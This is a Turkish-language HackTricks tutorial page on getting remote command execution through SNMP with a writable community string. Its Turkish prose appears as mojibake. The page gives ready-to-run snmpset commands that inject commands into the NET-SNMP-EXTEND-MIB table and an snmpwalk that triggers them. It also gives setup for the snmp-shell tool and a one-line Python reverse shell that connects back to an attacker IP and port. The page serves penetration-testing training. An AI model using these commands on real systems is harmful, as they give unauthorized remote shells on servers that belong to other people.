{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# SNMP RCE

SNMP, yÃ¶netici cihaz veya sunucudaki varsayÄ±lan yapÄ±landÄ±rmayÄ± gÃ¶z ardÄ± ederse bir saldÄ±rgan tarafÄ±ndan istismar edilebilir. **Yazma izinlerine sahip SNMP topluluÄŸunu (rwcommunity)** kÃ¶tÃ¼ye kullanarak, saldÄ±rgan sunucuda komutlar Ã§alÄ±ÅŸtÄ±rabilir.

## Ek Komutlarla Hizmetleri GeniÅŸletme

SNMP hizmetlerini geniÅŸletmek ve ek komutlar eklemek iÃ§in, "nsExtendObjects" tablosuna yeni **satÄ±rlar eklemek** mÃ¼mkÃ¼ndÃ¼r. Bu, `snmpset` komutunu kullanarak ve gerekli parametreleri, yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n mutlak yolu ve Ã§alÄ±ÅŸtÄ±rÄ±lacak komut dahil olmak Ã¼zere saÄŸlayarak gerÃ§ekleÅŸtirilebilir:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## KomutlarÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in Enjekte Edilmesi

SNMP hizmetinde Ã§alÄ±ÅŸtÄ±rÄ±lacak komutlarÄ±n enjekte edilmesi, Ã§aÄŸrÄ±lan ikili/dosyanÄ±n varlÄ±ÄŸÄ±nÄ± ve Ã§alÄ±ÅŸtÄ±rÄ±labilirliÄŸini gerektirir. **`NET-SNMP-EXTEND-MIB`** Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyanÄ±n mutlak yolunu saÄŸlamayÄ± zorunlu kÄ±lar.

Enjekte edilen komutun Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in, `snmpwalk` komutu SNMP hizmetini listelemek iÃ§in kullanÄ±labilir. **Ã‡Ä±ktÄ±, komutu ve ona baÄŸlÄ± ayrÄ±ntÄ±larÄ±, mutlak yol da dahil olmak Ã¼zere, gÃ¶sterecektir:**
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Enjekte Edilen KomutlarÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

**Enjekte edilen komut okunduÄŸunda, Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.** Bu davranÄ±ÅŸ **`run-on-read()`** olarak bilinir. Komutun yÃ¼rÃ¼tÃ¼lmesi, snmpwalk okumasÄ± sÄ±rasÄ±nda gÃ¶zlemlenebilir.

### SNMP ile Sunucu Shell Elde Etme

Sunucu Ã¼zerinde kontrol saÄŸlamak ve bir sunucu shell elde etmek iÃ§in, mxrch tarafÄ±ndan geliÅŸtirilen bir python script'i [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) adresinden kullanÄ±labilir.

Alternatif olarak, SNMP'ye belirli bir komut enjekte ederek manuel olarak bir ters shell oluÅŸturulabilir. Bu komut, snmpwalk tarafÄ±ndan tetiklenir ve saldÄ±rganÄ±n makinesine bir ters shell baÄŸlantÄ±sÄ± kurarak, kurban makinesi Ã¼zerinde kontrol saÄŸlar.
Bunu Ã§alÄ±ÅŸtÄ±rmak iÃ§in Ã¶n koÅŸulu yÃ¼kleyebilirsiniz:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Veya bir ters kabuk:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Referanslar
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
